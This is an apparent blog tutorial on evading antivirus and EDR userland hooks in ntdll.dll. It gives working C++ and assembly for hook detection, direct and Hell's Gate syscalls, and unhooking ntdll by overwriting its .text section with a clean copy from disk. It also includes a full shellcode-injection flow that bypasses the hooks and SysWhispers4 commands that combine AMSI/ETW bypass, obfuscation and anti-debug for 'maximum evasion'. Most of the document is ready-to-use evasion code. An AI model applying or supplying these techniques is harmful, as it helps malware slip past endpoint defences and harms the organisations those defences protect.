---
title: "AV & EDR Hooking Evasion — From Theory to Surgical Unhooking"
date: 2026-04-13 01:00:00 +0200
categories: [Malware Development, Evasion]
tags: [edr, av, hooking, syscalls, ntdll, syswhispers, hells-gate, unhooking, direct-syscalls, perun-farts, fresh-copy, evasion, windows-internals]
description: "A complete guide to understanding AV and EDR userland hooks, how to detect them, and six progressive techniques to evade or remove them — from direct syscalls to surgical per-function restoration."
pin: false
math: false
mermaid: false
---

> All techniques in this post are for **educational purposes and authorized security testing only**.
{: .prompt-warning }

---

## What Problem Are We Solving?

Imagine you are at an airport. Every gate has a security guard (the EDR) watching everyone who passes through (API calls). The guard checks your ticket, inspects your bag, and decides if you can board. If you're doing something suspicious (shellcode injection), the guard stops you.

**The hook is the guard.**

EDR products work by intercepting sensitive Windows API calls before they reach the kernel. This blog covers exactly how that interception works, how to detect it, and six techniques to bypass it completely.

```
┌──────────────────────────────────────────────────────────────────────────┐
│                  The Core Problem — EDR Hooking                          │
│                                                                          │
│  Your Code                                                               │
│       │  calls VirtualAlloc / NtAllocateVirtualMemory                   │
│       ▼                                                                  │
│  ┌─────────────────────────────────────────────────────────────────────┐ │
│  │  ntdll.dll (in your process memory)                                 │ │
│  │  ┌──────────────────────────────────────────────────────────────┐  │ │
│  │  │  NtAllocateVirtualMemory:                                    │  │ │
│  │  │  E9 XX XX XX XX  ← JMP to EDR monitoring DLL  ← HOOK HERE  │  │ │
│  │  │  (original bytes overwritten by EDR at startup)             │  │ │
│  │  └──────────────────────────────────────────────────────────────┘  │ │
│  └─────────────────────────────────────────────────────────────────────┘ │
│       │                                                                  │
│       ▼                                                                  │
│  EDR DLL inspects arguments → BLOCKS or ALLOWS                          │
│       │                                                                  │
│       ▼  (if allowed)                                                    │
│  Kernel (Ring 0) performs the operation                                  │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Part 1 — Theory: What is Function Hooking?

### The Simple Analogy

Think of `ntdll.dll` as the receptionist desk between your office (your program, Ring 3) and the CEO's office (the Windows kernel, Ring 0). Every request must go through reception.

An EDR replaces the receptionist with its own spy who secretly logs everything, reads all the documents you're submitting, and can reject the request before it ever reaches the CEO.

### Where Hooking Happens

```
┌──────────────────────────────────────────────────────────────────────────┐
│                   Windows Hooking Layers                                 │
├───────────┬──────────────────────────────┬───────────┬───────────────────┤
│ Layer     │ Location                     │ Who Uses  │ Stability         │
├───────────┼──────────────────────────────┼───────────┼───────────────────┤
│ User      │ ntdll.dll in-memory patches  │ Most AVs  │ Patchable by us!  │
│ User      │ IAT / EAT patching           │ Older AVs │ Easily bypassed   │
│ Kernel    │ SSDT hooks (legacy)          │ Legacy    │ Blocked by KPP    │
│ Kernel    │ Kernel callbacks             │ Modern    │ Robust, hard      │
│ Kernel    │ Minifilter drivers           │ DLP / EDR │ Very robust       │
└───────────┴──────────────────────────────┴───────────┴───────────────────┘
```

> The good news: most AV/EDR hooks live in user space inside `ntdll.dll` — memory your process **owns and can modify**. That is the fundamental weakness this entire blog exploits.
{: .prompt-tip }

### The Windows API Call Chain

Every call your program makes to the Windows kernel follows this exact path:

```
┌──────────────────────────────────────────────────────────────────────────┐
│              The Windows API Call Chain (Normal Flow)                    │
│                                                                          │
│  Your Code (Ring 3)                                                      │
│       │                                                                  │
│       │  VirtualAlloc(...)                                               │
│       ▼                                                                  │
│  kernel32.dll / kernelbase.dll                                           │
│  (high-level wrappers — VirtualAlloc, CreateFile, etc.)                 │
│       │                                                                  │
│       ▼                                                                  │
│  ntdll.dll  ← EDR HOOKS GO HERE (last stop before kernel)               │
│  NtAllocateVirtualMemory stub:                                           │
│    mov r10, rcx                                                          │
│    mov eax, 0x18   ; Syscall Service Number (SSN)                       │
│    syscall         ; CPU jumps to Ring 0                                 │
│    ret                                                                   │
│       │                                                                  │
│       ▼  CPU transitions to Ring 0                                       │
│  Windows Kernel (ntoskrnl.exe)                                           │
│  SSDT dispatcher routes SSN → actual kernel function                    │
│       │                                                                  │
│       ▼                                                                  │
│  Operation completed, result returned to Ring 3                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### What a Hook Looks Like in Memory

**Clean (unhooked) ntdll stub:**

```asm
; NtAllocateVirtualMemory — clean, no EDR
4C 8B D1          mov     r10, rcx        ; required by x64 ABI
B8 18 00 00 00    mov     eax, 0x18       ; SSN = 0x18 for this function
0F 05             syscall                 ; kernel transition
C3                ret
```

**Hooked by EDR:**

```asm
; NtAllocateVirtualMemory — HOOKED
E9 XX XX XX XX    jmp     EDR_Monitor!NtAllocateVirtualMemory_Hook
; ↑ first 5 bytes overwritten with a near jump
; original instructions are saved by the EDR in a trampoline
; execution now goes → EDR's DLL → inspect args → maybe block → back
```

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Before and After EDR Hook Installation                      │
│                                                                          │
│  CLEAN:                           HOOKED:                                │
│  ┌──────────────────────────┐    ┌──────────────────────────┐           │
│  │  4C 8B D1  mov r10,rcx  │    │  E9 AB CD EF 01  jmp ... │           │
│  │  B8 18 00  mov eax,18h  │    │  ?? ?? ?? ?? ??           │           │
│  │  0F 05     syscall      │    │  ?? ?? ?? ?? ??           │           │
│  │  C3        ret          │    │  C3        ret            │           │
│  └──────────────────────────┘    └──────────────────────────┘           │
│                                         │                                │
│                                         ▼                                │
│                                  EDR Monitoring DLL                      │
│                                  - Read arguments                        │
│                                  - Check against rules                   │
│                                  - Block or allow                        │
└──────────────────────────────────────────────────────────────────────────┘
```

### How EDRs Install Hooks

When a new process starts, the EDR's **kernel driver** registers a callback (`PsSetLoadImageNotifyRoutine`). When any process loads a DLL, the kernel driver fires and injects the EDR's monitoring DLL into the new process via an APC (Asynchronous Procedure Call). That DLL then:

1. Calls `VirtualProtect` to make `ntdll.dll` pages writable
2. Overwrites the first bytes of each target function with a `JMP` to its own code
3. Restores the original memory protections

### What EDRs Monitor

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Most Commonly Hooked NT Functions                           │
├────────────────────┬─────────────────────────────────┬───────────────────┤
│ Category           │ Functions Hooked                 │ Threat Detected   │
├────────────────────┼─────────────────────────────────┼───────────────────┤
│ Memory             │ NtAllocateVirtualMemory          │ Shellcode alloc   │
│                    │ NtWriteVirtualMemory             │ Process injection  │
│                    │ NtProtectVirtualMemory           │ RWX memory        │
├────────────────────┼─────────────────────────────────┼───────────────────┤
│ Process/Thread     │ NtCreateProcess                  │ Process spawning  │
│                    │ NtCreateThreadEx                 │ Thread injection   │
│                    │ NtOpenProcess                    │ Cred dumping      │
├────────────────────┼─────────────────────────────────┼───────────────────┤
│ Code Execution     │ NtMapViewOfSection               │ DLL injection     │
│                    │ NtQueueApcThread                 │ APC injection     │
│                    │ NtSetContextThread               │ Thread hijacking  │
├────────────────────┼─────────────────────────────────┼───────────────────┤
│ Filesystem/Reg     │ NtCreateFile                     │ Ransomware        │
│                    │ NtOpenKey, NtSetValueKey         │ Persistence       │
├────────────────────┼─────────────────────────────────┼───────────────────┤
│ Network            │ NtDeviceIoControlFile (Winsock)  │ C2 comms          │
│                    │ WSASend, connect                 │ Data exfil        │
└────────────────────┴─────────────────────────────────┴───────────────────┘
```

### The Critical Weakness

> **The hooks live inside memory your process owns.** Your process can read them, compare them to the original, and patch them back — or skip them entirely. This is the foundation of every technique in this blog.
{: .prompt-warning }

### Detecting Hooks — Automated Detection Code

Before choosing an evasion approach, it helps to know which functions are hooked. A `JMP` at byte 0 means the function is hooked:

```cpp
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <unordered_map>
#include <string>

#pragma comment(lib, "Dbghelp.lib")

// Returns true if the address starts with a JMP instruction
bool IsJmpInstruction(BYTE* addr) {
    return (addr[0] == 0xFF && addr[1] == 0x25) || // FF 25 = indirect JMP
           (addr[0] == 0xE9) ||                      // E9   = near JMP
           (addr[0] == 0xEB);                         // EB   = short JMP
}

std::unordered_map<std::string, DWORD> GetHookedNtFunctionOffsets() {
    std::unordered_map<std::string, DWORD> hookedOffsets;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return hookedOffsets;

    ULONG exportDirSize;
    auto pExportDir = (PIMAGE_EXPORT_DIRECTORY)ImageDirectoryEntryToData(
        hNtdll, TRUE, IMAGE_DIRECTORY_ENTRY_EXPORT, &exportDirSize);
    if (!pExportDir) return hookedOffsets;

    DWORD* functionRVAs = (DWORD*)((BYTE*)hNtdll + pExportDir->AddressOfFunctions);
    DWORD* nameRVAs     = (DWORD*)((BYTE*)hNtdll + pExportDir->AddressOfNames);
    WORD*  ordinals     = (WORD*) ((BYTE*)hNtdll + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        const char* functionName = (const char*)hNtdll + nameRVAs[i];

        // Only check Nt/Zw functions, skip internal Ntdll* helpers
        if (strncmp(functionName, "Nt", 2) != 0 &&
            strncmp(functionName, "Zw", 2) != 0) continue;
        if (strncmp(functionName, "Ntdll", 5) == 0) continue;

        DWORD funcRVA = functionRVAs[ordinals[i]];
        BYTE* functionAddress = (BYTE*)hNtdll + funcRVA;

        if (IsJmpInstruction(functionAddress)) {
            hookedOffsets[functionName] = funcRVA;
            std::cout << "[HOOKED] " << functionName
                      << " at RVA 0x" << std::hex << funcRVA
                      << " → " << static_cast<void*>(functionAddress) << "\n";
        }
    }
    return hookedOffsets;
}
```

**Example Output (system with BitDefender):**
```
[HOOKED] NtAllocateVirtualMemory at RVA 0x9c440 → 0x00007FFAB2DC4440
[HOOKED] NtCreateThreadEx       at RVA 0x9f210 → 0x00007FFAB2DC7210
[HOOKED] NtWriteVirtualMemory   at RVA 0xa1830 → 0x00007FFAB2DC9830
[HOOKED] NtProtectVirtualMemory at RVA 0x9e100 → 0x00007FFAB2DCC100
[HOOKED] ZwCreateThread         at RVA 0x9c880 → 0x00007FFAB2DCC880
```

### Beyond Userland: What We Cannot Touch

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Three Detection Layers — What This Blog Covers              │
│                                                                          │
│  Layer 1: Userland ntdll.dll Hooks           ← THIS BLOG COVERS THIS   │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  JMP patches on Nt* function stubs inside ntdll.dll               │  │
│  │  ✅ All 6 techniques here defeat this layer                        │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  Layer 2: Kernel Callbacks                   ← NOT COVERED HERE         │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  PsSetCreateProcessNotifyRoutineEx                                 │  │
│  │  PsSetCreateThreadNotifyRoutine                                    │  │
│  │  ObRegisterCallbacks                                               │  │
│  │  ❌ Fire inside the kernel — no userland technique can stop these  │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  Layer 3: ETW-TI (Event Tracing for Windows – Threat Intelligence)      │
│  ┌────────────────────────────────────────────────────────────────────┐  │
│  │  Kernel-originated telemetry on memory alloc, thread creation     │  │
│  │  ❌ Cannot be silenced by patching ntdll.dll from userland        │  │
│  └────────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## The Six Techniques — Overview

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Six Techniques — Progression from Simple to Surgical        │
│                                                                          │
│  01 Direct Syscalls      → Skip ntdll entirely, call kernel directly    │
│  02 Hell's Gate          → Resolve syscall numbers at runtime           │
│  03 Fresh Copy           → Load clean ntdll from disk, overwrite hooks  │
│  04 Perun Farts          → Load clean ntdll from suspended process      │
│  05 Unhook Detected      → Detect hooks first, restore only those       │
│  06 Unhook Desired       → You decide exactly which functions to clean  │
│                                                                          │
│  Simple ◄────────────────────────────────────────────────► Surgical     │
│    01          02          03          04          05          06        │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Technique 01 — Direct Syscalls

### The Simple Analogy

Instead of going through reception (ntdll), you find a secret back door directly into the CEO's office (kernel). The guard at reception never even sees you.

### What is a Syscall?

Every sensitive operation (allocate memory, create threads, open files) requires asking the kernel. Your program lives in Ring 3 (user mode). The kernel lives in Ring 0. The bridge between them is the `syscall` CPU instruction.

Before firing `syscall`, you load a number into the `EAX` register — the **Syscall Service Number (SSN)**. This tells the kernel which operation you want.

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Ring 3 → Ring 0: Normal Flow vs Direct Syscall              │
│                                                                          │
│  NORMAL (through ntdll, hook fires):                                    │
│  Your Code → VirtualAlloc → NtAllocateVirtualMemory (ntdll)            │
│                              ↓ EDR hook intercepts here                  │
│                              mov eax, 0x18  ← SSN                       │
│                              syscall → Kernel ✓                         │
│                                                                          │
│  DIRECT SYSCALL (ntdll bypassed completely):                            │
│  Your Code → [your own stub]                                             │
│              mov r10, rcx                                                │
│              mov eax, 0x18   ← SSN hardcoded or resolved                │
│              syscall → Kernel ✓                                          │
│              (EDR hook in ntdll is NEVER reached)                        │
└──────────────────────────────────────────────────────────────────────────┘
```

### The Direct Syscall Stub (Assembly)

```asm
; Your own stub — EDR's hook in ntdll is completely skipped
NtAllocateVirtualMemory PROC
    mov     r10, rcx          ; Windows x64 ABI: first arg must be in R10 at kernel entry
    mov     eax, 18h          ; SSN for NtAllocateVirtualMemory (Windows 11 24H2)
    syscall                   ; CPU transitions to Ring 0, kernel handles the call
    ret
NtAllocateVirtualMemory ENDP
```

Just four instructions. The EDR's JMP hook sitting inside `ntdll.dll` is never touched because you never call the `ntdll.dll` function at all.

### The Problem: SSNs Change Between Windows Versions

```
┌──────────────────────────────────────────────────────────────────────────┐
│              SSN Values Are NOT Fixed Across Windows Versions            │
│                                                                          │
│  NtAllocateVirtualMemory SSN:                                           │
│  ┌──────────────────────────────────────────────────┐                   │
│  │  Windows 10 1507    → SSN = 0x15                 │                   │
│  │  Windows 10 1903    → SSN = 0x18                 │                   │
│  │  Windows 11 22H2    → SSN = 0x18                 │                   │
│  │  Windows 11 24H2    → SSN = 0x18 (same here)     │                   │
│  │  Future updates     → Could be ANYTHING          │                   │
│  └──────────────────────────────────────────────────┘                   │
│                                                                          │
│  Hardcoding 0x18 means your code might call the WRONG kernel function  │
│  on a different Windows version, or crash entirely.                     │
│                                                                          │
│  Solution: resolve the SSN at RUNTIME → Technique 02 (Hell's Gate)     │
└──────────────────────────────────────────────────────────────────────────┘
```

### Tool: SysWhispers4

Writing syscall stubs by hand for every Windows version is not practical. [SysWhispers4](https://github.com/JoasASantos/SysWhispers4) is a code generator that produces typed C headers and assembly stubs with runtime SSN resolution built in.

**Evolution of SysWhispers:**

```
┌──────────────────────────────────────────────────────────────────────────┐
│              SysWhispers Version History                                 │
├───────────────┬──────────────────────────────────────────────────────────┤
│ Version       │ Key Capability                                           │
├───────────────┼──────────────────────────────────────────────────────────┤
│ SysWhispers 1 │ Static SSN table, direct syscalls for ~12 functions      │
│ SysWhispers 2 │ Hell's Gate: runtime SSN by reading ntdll opcode bytes   │
│ SysWhispers 3 │ Halo's Gate, Tartarus' Gate, indirect syscalls, MinGW    │
│ SysWhispers 4 │ 8 resolution methods, 64 functions, ARM64, obfuscation,  │
│               │ AMSI/ETW bypass, sleep encryption, anti-debug, and more  │
└───────────────┴──────────────────────────────────────────────────────────┘
```

**SSN Resolution Methods in SysWhispers4:**

```
┌──────────────────────────────────────────────────────────────────────────┐
│              SysWhispers4 — SSN Resolution Methods                       │
│                                                                          │
│  Hell's Gate:                                                            │
│  Reads mov eax, SSN opcode from ntdll stub                              │
│  ❌ Fails if stub is hooked (bytes overwritten)                          │
│                                                                          │
│  Halo's Gate:                                                            │
│  If stub is hooked, look at neighboring stubs and infer SSN             │
│  by arithmetic (sequential SSNs in adjacent stubs)                      │
│  ✅ Survives partial hooking                                              │
│                                                                          │
│  Tartarus' Gate:                                                         │
│  Detects E9, FF25, EB, CC hook patterns + scans 16 neighbors           │
│  ✅ More robust than Halo's Gate                                          │
│                                                                          │
│  FreshyCalls (default):                                                  │
│  Sorts all Nt* exports by virtual address — position = SSN             │
│  Never reads function bytes at all, just export table addresses         │
│  ✅ Very reliable even under heavy hooking                                │
│                                                                          │
│  RecycledGate:                                                           │
│  FreshyCalls + cross-validates with opcode reading                      │
│  ✅ Most resilient method available                                       │
│                                                                          │
│  SyscallsFromDisk:                                                       │
│  Maps clean ntdll from \KnownDlls\ntdll.dll (trusted kernel object)    │
│  ✅ In-memory hooks completely irrelevant                                 │
└──────────────────────────────────────────────────────────────────────────┘
```

**Invocation Methods — Where Does the `syscall` Instruction Fire From?**

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Invocation Methods — RIP Origin at Kernel Entry             │
│                                                                          │
│  Embedded (direct):                                                      │
│  syscall lives inside YOUR binary → RIP points to your PE               │
│  ⚠ EDRs checking for syscalls from outside ntdll will flag this         │
│                                                                          │
│  Indirect:                                                               │
│  Find syscall;ret gadget already inside ntdll → jump to it              │
│  At kernel entry, RIP points inside ntdll → looks legitimate            │
│  ✅ Bypasses RIP origin checks                                            │
│                                                                          │
│  Randomized Indirect:                                                    │
│  Pick a DIFFERENT gadget from a pool of 64 on every call                │
│  ✅ Defeats EDRs that whitelist specific gadget addresses                 │
│                                                                          │
│  Egg Hunt:                                                               │
│  Binary on disk has NO 0F 05 (syscall) opcode at all                    │
│  A placeholder egg is replaced at runtime by SW4_HatchEggs()            │
│  ✅ Defeats static scanners looking for syscall opcode in your file      │
└──────────────────────────────────────────────────────────────────────────┘
```

**Generating stubs with SysWhispers4:**

```bash
# Clone the repo
git clone https://github.com/JoasASantos/SysWhispers4
cd SysWhispers4

# Optional: update SSN table from j00ru database (XP through Win11 24H2)
python3 scripts/update_syscall_table.py

# Generate for common memory/process/thread functions (good starting point)
python syswhispers.py --preset common

# Injection-focused, indirect syscalls, Tartarus' Gate resolution
python syswhispers.py --preset injection --method indirect --resolve tartarus

# Only specific functions you need
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx,NtWriteVirtualMemory

# Maximum evasion — all features combined
python syswhispers.py --preset stealth \
  --method randomized --resolve recycled \
  --obfuscate --encrypt-ssn --stack-spoof \
  --etw-bypass --amsi-bypass --unhook-ntdll \
  --anti-debug --sleep-encrypt
```

**Generated files:**

```
┌──────────────────────────────────────────────────────────────────────────┐
│              SysWhispers4 Output Files                                   │
├───────────────────────────┬──────────────────────────────────────────────┤
│ File                      │ Contents                                     │
├───────────────────────────┼──────────────────────────────────────────────┤
│ SW4Syscalls_Types.h       │ NT type definitions, structs, enums, typedefs│
│ SW4Syscalls.h             │ Function prototypes, SW4_Initialize() decl   │
│ SW4Syscalls.c             │ Runtime SSN resolution, evasion helpers      │
│ SW4Syscalls.asm           │ MASM assembly stubs with syscall instructions │
└───────────────────────────┴──────────────────────────────────────────────┘
```

> In Visual Studio: enable MASM via Project → Build Customizations → check `masm (.targets)`, then add all four files to your project.
{: .prompt-tip }

**Using the Generated Code:**

```cpp
#include <windows.h>
#include <iostream>
#include "SW4Syscalls.h"

using namespace std;

int main(void) {
    // SW4_Initialize() resolves all SSNs at runtime (call once at startup)
    // Note: SW4_Initialize() is called automatically for most presets
    // or you can call it manually before any SW4_ function

    PVOID base = NULL;
    SIZE_T size = 0x1000;

    // SW4_NtAllocateVirtualMemory — identical signature to real NtAllocateVirtualMemory
    // The EDR's hook in ntdll is NEVER reached
    NTSTATUS st = SW4_NtAllocateVirtualMemory(
        GetCurrentProcess(),   // hProcess
        &base,                 // BaseAddress (output)
        0,                     // ZeroBits
        &size,                 // RegionSize
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (NT_SUCCESS(st)) {
        cout << "[+] Memory allocated at " << base
             << " size " << size << " — EDR never saw it" << endl;
    }

    return 0;
}
```

---

## Technique 02 — Dynamic SSN Resolution (Hell's Gate)

### The Simple Analogy

You want to call the kernel but need the right "extension number" (SSN). Instead of looking it up in a phonebook that might be outdated (hardcoded table), you sneak a look at the receptionist's screen (ntdll opcode bytes) to read the number directly. If the screen is blocked (hook), you look at the person next to them to guess the number.

### How Hell's Gate Works

Every clean NT stub in ntdll starts with the same opcode pattern:

```asm
; NtAllocateVirtualMemory — unhooked
4C 8B D1          mov r10, rcx
B8 18 00 00 00    mov eax, 0x18    ← SSN lives at bytes 4-5
0F 05             syscall
C3                ret
```

Hell's Gate reads bytes 4-5 (`B8 ?? ??`) to extract the SSN. No hardcoded table — the correct number is always pulled from the running system's own ntdll.

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Hell's Gate — SSN Extraction from Opcode Bytes              │
│                                                                          │
│  Byte offset:  0    1    2    3    4    5    6    7    8    9            │
│  Hex:         4C   8B   D1   B8   18   00   00   00   0F   05           │
│               └─────────┘   └──┘  └─────────┘   └─────────────────┘    │
│               mov r10,rcx  mov   SSN = 0x18     syscall ; ret           │
│                            eax,                                          │
│                                                                          │
│  Hell's Gate reads bytes at offset 4-5 → SSN = 0x18                    │
│                                                                          │
│  ⚠ If EDR hooks the stub:                                                │
│  Byte 0 = E9 (JMP) → bytes 4-5 are part of the jump target → GARBAGE   │
│  Hell's Gate reads the wrong value → syscall fails or crashes           │
│  Solution: look at neighbor stubs (Halo's Gate / Tartarus' Gate)        │
└──────────────────────────────────────────────────────────────────────────┘
```

### Data Structures

```cpp
// hellsgate.h — two structures to track each NT function

typedef struct _VX_TABLE_ENTRY {
    PVOID   pAddress;    // address of the NT stub inside ntdll
    DWORD64 dwHash;      // djb2 hash of function name (avoids GetProcAddress)
    WORD    wSystemCall; // extracted SSN — filled at runtime, starts as 0
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, *PVX_TABLE;
```

### Resolving the SSN: GetVxTableEntry

```cpp
BOOL GetVxTableEntry(PVOID pModuleBase,
                     PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
                     PVX_TABLE_ENTRY pVxTableEntry) {

    PDWORD pdwAddressOfFunctions =
        (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames =
        (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD  pwAddressOfNameOrdinals =
        (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName  = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase +
            pdwAddressOfFunctions[pwAddressOfNameOrdinals[cx]];

        // Match by djb2 hash — never calls GetProcAddress
        if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
            pVxTableEntry->pAddress = pFunctionAddress;

            // Check for clean stub pattern: 4C 8B D1 B8 ?? ?? 00 00
            if (*((PBYTE)pFunctionAddress)     == 0x4c &&
                *((PBYTE)pFunctionAddress + 1) == 0x8b &&
                *((PBYTE)pFunctionAddress + 2) == 0xd1 &&
                *((PBYTE)pFunctionAddress + 3) == 0xb8) {
                // Stub is clean — extract SSN from bytes 4-5
                pVxTableEntry->wSystemCall =
                    *((WORD*)((PBYTE)pFunctionAddress + 4));
            }
            // else: stub is hooked → SSN stays 0 (handle in Halo's Gate extension)
            return TRUE;
        }
    }
    return FALSE;
}
```

### Invoking the Syscall: HellDescent (Assembly)

```asm
; hellsgate.asm — the actual syscall stub
.code

extern wSystemCall: WORD   ; shared with C side — holds the resolved SSN

HellDescent proc
    mov r10, rcx           ; Windows x64 calling convention: R10 = first arg
    mov eax, wSystemCall   ; load the SSN resolved at runtime
    syscall                ; enter the kernel
    ret
HellDescent endp

end
```

### Full Hell's Gate Injection Flow

```cpp
// main.c — abridged flow
// 1. Find ntdll base by walking the PEB (no GetModuleHandle = no hook risk)
PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
// ... walk Ldr->InMemoryOrderModuleList to find ntdll ...

// 2. Parse the PE export directory from the found module base

// 3. Resolve SSNs for each function (using djb2 hashes, not strings)
VX_TABLE Table = { 0 };
Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
GetVxTableEntry(pModuleBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory);

Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
GetVxTableEntry(pModuleBase, pImageExportDirectory, &Table.NtCreateThreadEx);

// 4. Allocate RW memory for shellcode (EDR hook skipped)
PVOID lpAddress = NULL;
SIZE_T sDataSize = sizeof(shellcode);
wSystemCall = Table.NtAllocateVirtualMemory.wSystemCall;  // set SSN global
NTSTATUS status = HellDescent(
    (HANDLE)-1, &lpAddress, 0, &sDataSize,
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
);

// 5. Copy shellcode into the allocation
memcpy(lpAddress, shellcode, sizeof(shellcode));

// 6. Change memory to RX
ULONG ulOldProtect = 0;
wSystemCall = Table.NtProtectVirtualMemory.wSystemCall;
status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize,
    PAGE_EXECUTE_READ, &ulOldProtect);

// 7. Create execution thread
HANDLE hThread = NULL;
wSystemCall = Table.NtCreateThreadEx.wSystemCall;
status = HellDescent(&hThread, THREAD_ALL_ACCESS, NULL,
    (HANDLE)-1, lpAddress, NULL, FALSE, 0, 0, 0, NULL);

// 8. Wait for thread to finish
wSystemCall = Table.NtWaitForSingleObject.wSystemCall;
status = HellDescent(hThread, FALSE, NULL);
```

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Hell's Gate — Why Each Design Choice Matters                │
│                                                                          │
│  PEB Walk instead of GetModuleHandle                                     │
│  → GetModuleHandle is itself a Win32 API that could be hooked           │
│  → Walking the linked list in the PEB is pure data access               │
│                                                                          │
│  djb2 hashes instead of string names                                    │
│  → No plaintext "NtAllocateVirtualMemory" string in binary              │
│  → Static scanner cannot grep function names to flag the binary         │
│                                                                          │
│  HellDescent for every call                                              │
│  → RW → copy → RX → thread pattern uses NO ntdll functions directly    │
│  → EDR hooks on all 4 functions are bypassed completely                 │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Technique 03 — Fresh Copy (Load Clean ntdll from Disk)

### The Simple Analogy

The guard (EDR) has tampered with the official rulebook (ntdll.dll in memory). You go to the library, grab a clean original copy of the rulebook, and replace the tampered pages with the originals. Now the guard's modifications are gone.

### How It Works

```
┌──────────────────────────────────────────────────────────────────────────┐
│              Fresh Copy — Attack Flow                                    │
│                                                                          │
│  1. Read ntdll.dll directly from disk                                   │
│     (C:\Windows\System32\ntdll.dll — the original, unpatched file)     │
│                                                                          │
│  2. Map it into memory using CreateFileMapping + MapViewOfFile           │
│     (this creates a clean, unhooked image in a separate memory region)  │
│                                                                          │
│  3. Find the .text section in the clean copy                            │
│     (this section contains all the syscall stubs)                       │
│                                                                          │
│  4. VirtualProtect → make the LOADED ntdll .text section writable       │
│                                                                          │
│  5. memcpy clean .text → overwrite the hooked .text in loaded ntdll    │
│     (all JMP hooks are gone, replaced with original bytes)              │
│                                                                          │
│  6. VirtualProtect → restore original memory protection                 │
└──────────────────────────────────────────────────────────────────────────┘
```

### The Code

```cpp
// main — load and map a clean ntdll.dll from disk
// The XOR encryption hides the ntdll path from static scanners
XORcrypt((char*)sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);

HANDLE hFile = CreateFile(
    sNtdllPathW,
    GENERIC_READ,
    FILE_SHARE_READ, NULL,
    OPEN_EXISTING, 0, NULL
);

HANDLE hFileMapping = CreateFileMappingA(
    hFile, NULL,
    PAGE_READONLY | SEC_IMAGE,   // SEC_IMAGE: map as a PE image, not raw bytes
    0, 0, NULL
);

LPVOID pMapping = MapViewOfFile(
    hFileMapping,
    FILE_MAP_READ,
    0, 0, 0
);

// pMapping now holds a complete, clean, unhooked ntdll.dll image
```

```cpp
// UnhookNtdll — the core function
int UnhookNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
    DWORD oldprotect = 0;

    // Parse PE headers from the clean mapped copy
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pImgNTHead  = (PIMAGE_NT_HEADERS)
        ((DWORD_PTR)pMapping + pImgDOSHead->e_lfanew);

    // Find the .text section (contains all syscall stubs)
    for (int i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)
            ((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) +
             ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pImgSectionHead->Name, ".text")) {

            // Step 1: Make the loaded ntdll .text section writable
            VirtualProtect(
                (LPVOID)((DWORD_PTR)hNtdll + pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &oldprotect
            );

            // Step 2: Overwrite the hooked bytes with clean original bytes
            memcpy(
                (LPVOID)((DWORD_PTR)hNtdll + pImgSectionHead->VirtualAddress),
                (LPVOID)((DWORD_PTR)pMapping + pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize
            );

            // Step 3: Restore original memory protections
            VirtualProtect(
                (LPVOID)((DWORD_PTR)hNtdll + pImgSectionHead->VirtualAddress),
                pImgSectionHead->Misc.VirtualSize,
                oldprotect, &oldprotect
            );

            return 0;  // success
        }
    }
    return -1;  // .text not found
}
```

